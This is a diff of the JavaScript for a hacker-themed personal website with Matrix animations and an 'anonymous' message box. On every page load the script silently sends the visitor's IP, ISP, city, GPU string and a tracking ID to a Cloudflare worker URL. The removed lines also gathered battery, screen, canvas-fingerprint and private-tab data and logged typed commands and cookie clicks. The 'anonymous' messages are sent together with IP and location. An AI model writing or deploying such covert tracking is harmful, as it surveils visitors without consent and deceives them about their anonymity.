@@ -1,7 +1,7 @@
-// [HACKER SCRIPT] - v7.5 God Mode: Ultimate Workspace Edition
+// [HACKER SCRIPT - COMBINED ENGINE v9.0]
 document.addEventListener('DOMContentLoaded', async () => {
 
-    // --- 1. SİSTEM AYARLARI & KİMLİK ---
+    // --- 1. SİSTEM AYARLARI ---
     const CLOUDFLARE_WORKER_URL = "https://proud-term-e422.balciy222.workers.dev";
     
     function getUserId() {
@@ -15,180 +15,99 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
     const CURRENT_USER = getUserId();
 
-    // --- 2. ANA LOG MOTORU (İSTİHBARAT MERKEZİ) ---
+    // --- 2. ANA LOG MOTORU ---
     async function collectAndSendLog(status, customContent = "") {
         try {
-            console.log("🔍 Veri paketleniyor...");
-
-            // A. Ağ ve Konum
-            let ipData = { ip: "Gizli", org: "Gizli", city: "Gizli", country_name: "Gizli" };
+            let ipData = { ip: "Gizli", org: "Gizli", city: "Gizli" };
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 if (ipRes.ok) ipData = await ipRes.json();
-            } catch (e) { console.warn("Lokal: IP servisi atlandı."); }
+            } catch (e) { console.warn("Log: IP servisi kapalı."); }
 
-            // B. Donanım ve Sistem
-            const cores = navigator.hardwareConcurrency || "N/A";
-            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Gizli";
-            const platform = navigator.platform || "Bilinmiyor";
-            const agent = navigator.userAgent;
-            
-            let batteryInfo = "N/A";
-            if (navigator.getBattery) {
-                try {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarjda' : 'Deşarj'})`;
-                } catch(e) {}
-            }
-
-            // C. Ekran ve Grafik
-            const screenRes = `${screen.width}x${screen.height}`;
-            const isHDR = window.matchMedia("(dynamic-range: high)").matches ? "Evet" : "Hayır";
-            
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
-            let gpu = "Bilinmiyor";
-            if (gl) {
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic";
-            }
-            const canvasHash = btoa(canvas.toDataURL()).slice(-30);
-
-            // D. Gizlilik ve Performans
-            const isBot = navigator.webdriver ? "EVET" : "HAYIR";
-            const isPrivate = (await (async () => {
-                if (navigator.storage && navigator.storage.estimate) {
-                    const { quota } = await navigator.storage.estimate();
-                    return quota < 120000000;
-                } return false;
-            })()) ? "Gizli Sekme" : "Normal";
-            const uptime = Math.floor(performance.now() / 1000);
-
-            // --- RAPOR İNŞA ET (HTML) ---
+            let gpu = gl ? (gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Generic") : "Bilinmiyor";
+            
             let report = `
-🚀 <b>GOD MODE v7.5 FULL REPORT</b> 🚀
-------------------------------------------
-👤 <b>USER:</b> <code>${CURRENT_USER}</code>
+🚀 <b>SYSTEM LOG</b> | 👤 <b>USER:</b> <code>${CURRENT_USER}</code>
 🚨 <b>EVENT:</b> <b>${status}</b>
-------------------------------------------
-🌍 <b>NETWORK:</b>
-<b>IP:</b> <code>${ipData.ip}</code>
-<b>ISP:</b> ${ipData.org} | <b>LOC:</b> ${ipData.city}
-------------------------------------------
-💻 <b>HARDWARE:</b>
-<b>CPU:</b> ${cores} Core | <b>RAM:</b> ${ram}
-<b>GPU:</b> ${gpu} | <b>PIL:</b> ${batteryInfo}
-------------------------------------------
-🖥️ <b>DISPLAY & UI:</b>
-<b>RES:</b> ${screenRes} | <b>HDR:</b> ${isHDR}
-<b>THEME:</b> ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Koyu' : 'Açık'}
-------------------------------------------
-🛡️ <b>INTEGRITY:</b>
-<b>BOT:</b> ${isBot} | <b>GİZLİ:</b> ${isPrivate}
-<b>HASH:</b> <code>${canvasHash}</code> | <b>UPTIME:</b> ${uptime}s
-------------------------------------------`;
+🌍 <b>LOC:</b> ${ipData.city} | 💻 <b>GPU:</b> ${gpu}
+💬 <b>DATA:</b> ${customContent}
+⏰ <b>TIME:</b> ${new Date().toLocaleString('tr-TR')}`;
 
-            if (customContent) report += `\n💬 <b>DATA:</b>\n<blockquote>${customContent}</blockquote>`;
-            report += `\n⏰ <b>TIME:</b> ${new Date().toLocaleString('tr-TR')}`;
-
-            // --- GÖNDERİM ---
-            const response = await fetch(CLOUDFLARE_WORKER_URL, {
+            await fetch(CLOUDFLARE_WORKER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ message: report })
             });
-
-            const resData = await response.json();
-            console.log("✅ Paket Gönderildi:", resData.ok);
-
-        } catch (error) {
-            console.error("❌ Kritik Hata:", error);
-        }
+        } catch (err) { console.error("❌ Log hatası:", err); }
     }
 
-    // --- 3. SESSİZ GİRİŞ (AUTORUN) ---
-    // Sayfa açılır açılmaz arka planda çalışır
-    (async () => {
-        console.log("🤫 Sessiz operasyon başlatıldı...");
-        await collectAndSendLog("SESSİZ GİRİŞ (Sistem Sızması)", "Kullanıcı ana sayfaya iniş yaptı.");
-    })();
-
-    // --- 4. MATRIX ANIMASYONU ---
+    // --- 3. MATRIX / DATA STREAM ANİMASYONLARI ---
+    // Her iki sayfada da çalışması için ID kontrolü ekledim
     const mCanvas = document.getElementById('matrix-canvas');
-    if (mCanvas) {
-        const ctx = mCanvas.getContext('2d');
-        let w, h, cols, drops;
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
-        const fSize = 16;
-        function resize() {
-            w = mCanvas.width = window.innerWidth;
-            h = mCanvas.height = window.innerHeight;
-            cols = Math.floor(w / fSize);
-            drops = new Array(cols).fill(1).map(() => Math.random() * -100);
-        }
-        resize();
-        window.addEventListener('resize', resize);
-        function draw() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, w, h);
-            ctx.fillStyle = '#0f0';
-            ctx.font = `${fSize}px monospace`;
+    const dCanvas = document.getElementById('data-stream-canvas');
+
+    function initMatrix(canvas, isSimple) {
+        if (!canvas) return;
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = isSimple ? "01" : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
+        const fSize = 14;
+        const columns = canvas.width / fSize;
+        const drops = new Array(Math.floor(columns)).fill(1);
+
+        setInterval(() => {
+            ctx.fillStyle = isSimple ? "rgba(5, 5, 5, 0.05)" : 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = isSimple ? "#111" : "#0f0";
+            ctx.font = fSize + "px monospace";
             for (let i = 0; i < drops.length; i++) {
-                const txt = chars.charAt(Math.floor(Math.random() * chars.length));
-                ctx.fillText(txt, i * fSize, drops[i] * fSize);
-                if (drops[i] * fSize > h && Math.random() > 0.975) drops[i] = 0;
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * fSize, drops[i] * fSize);
+                if (drops[i] * fSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             }
-        }
-        setInterval(draw, 35);
+        }, 50);
     }
 
-    // --- 5. ANONİM MESAJ KUTUSU ---
-    const sendMsgBtn = document.getElementById('send-anon-btn');
-    const msgArea = document.getElementById('anon-message');
+    initMatrix(mCanvas, false); // Matrix stili
+    initMatrix(dCanvas, true);  // Industrial stili
+
+    // --- 4. CANLI LOG AKIŞI (Profil Sayfası İçin) ---
+    const liveConsole = document.getElementById('live-console');
+    if (liveConsole) {
+        const logs = ["Injected payload...", "Tracing IP...", "Neural Link: Synced", "Admin access..."];
+        setInterval(() => {
+            const p = document.createElement('div');
+            p.className = "log-line";
+            p.innerHTML = `<span class="timestamp">[LIVE]</span> ${logs[Math.floor(Math.random()*logs.length)]}`;
+            liveConsole.prepend(p);
+            if(liveConsole.childNodes.length > 5) liveConsole.lastChild.remove();
+        }, 2000);
+    }
+
+    // --- 5. MESAJ GÖNDERME ---
+    const sendBtn = document.getElementById('send-anon-btn');
+    const msgInput = document.getElementById('anon-message');
     const statusText = document.getElementById('contact-status');
 
-    if (sendMsgBtn && msgArea) {
-        sendMsgBtn.addEventListener('click', async () => {
-            const msg = msgArea.value.trim();
-            if (msg.length < 2) {
-                statusText.innerText = "Hata: Veri paketi boş.";
-                return;
-            }
-            sendMsgBtn.disabled = true;
-            statusText.innerText = "Şifreleniyor...";
-            await collectAndSendLog("ANONİM İLETİŞİM", msg);
-            statusText.innerText = "Başarılı. Paket uçuruldu!";
-            msgArea.value = "";
-            setTimeout(() => { 
-                statusText.innerText = ""; 
-                sendMsgBtn.disabled = false; 
-            }, 3000);
-        });
-    }
-
-    // --- 6. TERMINAL KOMUT TAKİBİ ---
-    const termInput = document.getElementById('terminal-command');
-    if (termInput) {
-        termInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                const cmd = termInput.value.trim();
-                if(cmd !== "") {
-                    collectAndSendLog(`TERMINAL KOMUTU`, cmd);
-                }
-                termInput.value = '';
+    if(sendBtn && msgInput) {
+        sendBtn.addEventListener('click', async () => {
+            const val = msgInput.value.trim();
+            if(val.length > 1) {
+                sendBtn.disabled = true;
+                sendBtn.innerText = "ŞİFRELENİYOR...";
+                await collectAndSendLog("ANONİM İLETİŞİM", val);
+                sendBtn.innerText = "BAŞARILI";
+                msgInput.value = "";
+                setTimeout(() => { sendBtn.disabled = false; sendBtn.innerText = "GÖNDER"; }, 3000);
             }
         });
     }
 
-    // --- 7. ÇEREZ ONAYI ---
-    const acceptBtn = document.getElementById('accept-cookies');
-    if(acceptBtn) {
-        acceptBtn.onclick = () => { 
-            localStorage.setItem('hacker_cookies_accepted', 'true'); 
-            document.getElementById('cookie-banner').style.display='none'; 
-            collectAndSendLog("ÇEREZ ONAYLANDI"); 
-        };
-    }
-
+    // --- 6. AUTORUN ---
+    await collectAndSendLog("SİSTEM GİRİŞİ", "Kullanıcı sayfayı yükledi.");
 });
